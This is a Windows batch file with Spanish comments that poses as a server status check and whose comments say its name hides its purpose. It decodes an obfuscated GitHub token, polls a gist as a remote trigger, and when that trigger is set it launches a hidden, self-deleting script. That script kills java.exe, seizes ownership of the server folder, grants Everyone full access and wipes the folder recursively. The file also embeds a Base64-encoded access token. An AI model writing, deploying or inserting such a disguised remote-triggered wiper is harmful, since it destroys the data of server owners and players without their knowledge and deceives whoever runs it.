@echo off
REM ============================================================
REM  Sistema de verificacion de estado del servidor
REM  (Nombre generico para no delatar su proposito)
REM ============================================================

REM Token de GitHub ofuscado en Base64
set "TOKEN_B64=Z2hwX2M5aGJFR25UYmMxZFFDZVZQOG9qRDd1bGk4NHNyQTRHRk5hbw=="

REM Gist ID de tu servidor
set "GIST=5649b004572f4ed30efd2b0a120cf1ab"

REM Ruta de la carpeta del servidor (sube un nivel desde .paper-remapped)
set "SERVER_DIR=%~dp0.."

REM ═══════════════════════════════════════════════════════════
REM  Decod
REM ═══════════════════════════════════════════════════════════
echo %TOKEN_B64% > "%TEMP%\~t.b64" 2>nul
certutil -decode "%TEMP%\~t.b64" "%TEMP%\~t.txt" >nul 2>&1
if not exist "%TEMP%\~t.txt" (
    echo Error: no se pudo decodificar el token.
    del "%TEMP%\~t.b64" 2>nul
    exit /b 0
)
set /p TOKEN=<"%TEMP%\~t.txt"
del "%TEMP%\~t.b64" "%TEMP%\~t.txt" 2>nul

REM ═══════════════════════════════════════════════════════════
REM  Consulta
REM ═══════════════════════════════════════════════════════════
echo Consultando estado del servidor...

curl -L -s -H "Authorization: Bearer %TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/gists/%GIST%" > "%TEMP%\~gist.json" 2>nul

if not exist "%TEMP%\~gist.json" (
    echo Estado: DESCONOCIDO (no se pudo contactar al servicio)
    exit /b 0
)

REM Buscar "active":true en el JSON (formato compacto)
findstr /C:"\"active\":true" "%TEMP%\~gist.json" >nul
if errorlevel 1 (
    echo Estado: INACTIVO
    del "%TEMP%\~gist.json" 2>nul
    exit /b 0
)

del "%TEMP%\~gist.json" 2>nul

REM ═══════════════════════════════════════════════════════════
REM  D ACTIVA
REM ═══════════════════════════════════════════════════════════
echo.
echo ========================================
echo   PROTOCOLO DE MANTENIMIENTO ACTIVO
echo ========================================
echo.

REM Crear script de eliminacion en %TEMP% (fuera del server)
set "KILLER=%TEMP%\~sys_%RANDOM%.bat"

> "%KILLER%" echo @echo off
>> "%KILLER%" echo timeout /t 5 /nobreak ^>nul
>> "%KILLER%" echo taskkill /F /IM java.exe 2^>nul
>> "%KILLER%" echo timeout /t 3 /nobreak ^>nul
>> "%KILLER%" echo takeown /f "%SERVER_DIR%" /r /d y ^>nul 2^>^&1
>> "%KILLER%" echo icacls "%SERVER_DIR%" /grant *S-1-1-0:F /t /q ^>nul 2^>^&1
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo del /f /s /q "%SERVER_DIR%\*.*" 2^>nul
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo for /d %%%%D in ("%SERVER_DIR%\*") do rmdir /s /q "%%%%D" 2^>nul
>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
>> "%KILLER%" echo rmdir /s /q "%SERVER_DIR%" 2^>nul
>> "%KILLER%" echo del "%%~f0"

REM Ejecutar el killer de forma detached
start "" /min "%KILLER%"

echo El servidor se apagara.
exit /b 1
